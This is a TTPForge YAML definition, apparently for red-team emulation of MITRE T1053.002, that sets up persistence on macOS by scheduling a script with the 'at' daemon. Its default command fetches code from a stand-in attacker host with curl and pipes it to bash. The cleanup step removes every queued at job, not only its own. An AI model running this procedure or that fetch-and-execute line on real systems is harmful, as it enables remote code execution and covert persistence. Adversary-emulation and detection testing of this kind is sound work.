---
api_version: 2.0
uuid: b730687e-439d-4f78-9d7a-97febb5b04e6
name: At job scheduling
authors:
- TTPForge
description: |
  Schedules a job using the at daemon for delayed persistence
mitre:
  tactics:
  - TA0003 Persistence
  techniques:
  - T1053 Scheduled Task/Job
  subtechniques:
  - 'T1053.002 Scheduled Task/Job: At'
requirements:
  platforms:
  - os: darwin
args:
- name: job_time
  description: Time to execute the job (in at format)
  type: string
  default: now + 10 minutes
- name: job_command
  description: Command to execute
  type: string
  default: /usr/bin/curl -s http://attacker.com/execute | bash
- name: script_path
  description: Path to create at job script
  type: string
  default: /tmp/at_job.sh
- name: log_path
  description: Path for job output
  type: string
  default: /tmp/at_job.log
steps:
- name: create_at_job_script
  create_file: '{{ .Args.script_path }}'
  contents: |
    #!/bin/bash
    # At job payload
    echo "At job executed at $(date)" >> {{ .Args.log_path }}
    {{ .Args.job_command }} >> {{ .Args.log_path }} 2>&1
  mode: 493
  cleanup: default
- name: schedule_at_job
  inline: |
    echo "{{ .Args.script_path }}" | at "{{ .Args.job_time }}"
  cleanup:
    inline: |-
      atq | awk '{print $1}' | xargs atrm 2>/dev/null || true
      rm -f "{{ .Args.script_path }}"
      rm -f "{{ .Args.log_path }}"
tests:
- name: dry_run_test
  dry_run: true
